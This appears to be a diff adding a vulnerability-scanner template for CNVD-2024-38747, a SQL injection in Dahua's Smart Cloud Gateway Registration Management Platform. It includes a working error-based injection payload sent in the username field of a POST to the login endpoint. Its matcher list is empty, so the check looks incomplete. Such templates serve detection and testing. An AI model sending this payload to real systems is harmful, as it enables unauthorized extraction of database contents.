@@ -1,0 +1,20 @@
+id: CNVD-2024-38747
+brief:
+    title: Zhejiang Dahua Smart Cloud Gateway Registration Platform - SQL Injection
+    by: s4e-io
+    level: high
+    about: Zhejiang Dahua Technology Co., Ltd. Smart Cloud Gateway Registration Management Platform has a SQL injection vulnerability, which can be exploited by attackers to obtain sensitive database informat...
+    label:
+        - cnvd
+        - cnvd2024
+        - sqli
+        - dahua
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/index.php/User/doLogin'
+      head:
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+      body: username=1')and+updatexml(1,concat(0x7e,md5({{num}}),0x7e),1)--+&password=
+      signs: []
